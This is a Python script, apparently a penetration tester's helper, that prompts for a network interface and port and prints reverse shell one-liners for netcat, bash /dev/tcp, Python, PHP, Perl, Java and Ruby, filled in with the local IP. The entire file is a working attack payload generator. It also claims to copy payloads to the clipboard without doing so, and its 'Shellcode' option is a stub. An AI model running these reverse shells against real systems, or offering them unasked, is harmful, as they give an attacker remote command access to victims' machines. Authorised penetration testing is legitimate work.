#!/usr/bin/python3
"""
Just something to make my life easier :)
PS. This is my attempt at trying to make code as unreadable as possible
"""
import netifaces as ni
from colorama import Fore
import pyperclip

type_of_payloads = ['Reverse Shell', 'Shellcode']

def main():
    choose_payload()

"""All of the payloads have been shamelessly fetched from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
"""
def rev_payload(ip: str, error: bool = False):
    payload_types = ["netcat", "old-netcat [more reliable]", "bash", "python3", "php", "perl", "java", "ruby"]
    print(Fore.RED + "Error enter a valid payload type") if error else ""
    print(Fore.MAGENTA + "==================================")
    print(Fore.MAGENTA + "|      Choose the payload        |")
    print(Fore.MAGENTA + "==================================")
    print(Fore.GREEN + "\n".join(
        [str(payload) + "." + payload_types[payload] for payload in range(len(payload_types))]))
    chosen_payload = int(input('Choose type of reverse shell payload [number] => '))
    print("Using the payload: " + payload_types[chosen_payload]) if chosen_payload < len(payload_types) else ""
    port = input("The port you want to listen on [1-65535]: ")
    # A list of payloads with the string formatted to include the ip and the port
    payloads = [f"nc -e /bin/sh {ip} {str(port)}", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {str(port)} >/tmp/f", f"bash -i >& /dev/tcp/{ip}/{str(port)} 0>&1",
                f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                f"php -r '$sock=fsockopen(\"{ip}\",{str(port)});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", f"perl -e 'use Socket;$i=\"{ip}\";$p={str(port)};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))" + "{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{str(port)};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
                f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{str(port)}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"]
    print(Fore.MAGENTA + "============= Payload ===============")
    print(payloads[chosen_payload]) if chosen_payload < len(payload_types) else rev_payload(ip=ip, error=True)
    print("Payload copied to the clipboard")

"""The following function will let the user choose an interface

:param error: Set to false by default and is used to print the error message
:type error: bool
"""
def choose_interface(error: bool = False):
    print(Fore.RED + "Error enter a valid interface") if error else ""
    print(Fore.MAGENTA + "==================================")
    print(Fore.MAGENTA + "|     Choose the interface       |")
    print(Fore.MAGENTA + "==================================")
    print(Fore.GREEN + "\n".join(
        [str(interface) + "." + ni.interfaces()[interface] for interface in range(len(ni.interfaces()))]))
    chosen_interface = int(input('Choose interface [number] => '))
    print("Using IP: " + ni.ifaddresses(ni.interfaces()[chosen_interface])[ni.AF_INET][0][
        'addr']) if chosen_interface < len(ni.interfaces()) else choose_interface(True)
    rev_payload(ip=ni.ifaddresses(ni.interfaces()[chosen_interface])[ni.AF_INET][0]['addr'])


"""The following function will take let the user select a payload and based on the type of payload call the necessary functions

:param error: Set to false by default and is used to print the error message
:type error: bool
"""
def choose_payload(error: bool = False):
    print(Fore.RED + "Error enter a valid payload") if error else ""
    print(Fore.MAGENTA + "==================================")
    print(Fore.MAGENTA + "|     Choose type of payload     |")
    print(Fore.MAGENTA + "==================================")
    print(Fore.GREEN + "\n".join(
        [str(payload_type) + "." + type_of_payloads[payload_type] for payload_type in range(len(type_of_payloads))]))
    chosen_type_of_payload = int(input('Choose type of payload [number] => '))
    print("") if chosen_type_of_payload < len(type_of_payloads) else choose_payload(True)
    # Only call the function if the reverse shell payload is selected
    choose_interface() if chosen_type_of_payload == 0 else ""


if __name__ == "__main__":
    main()
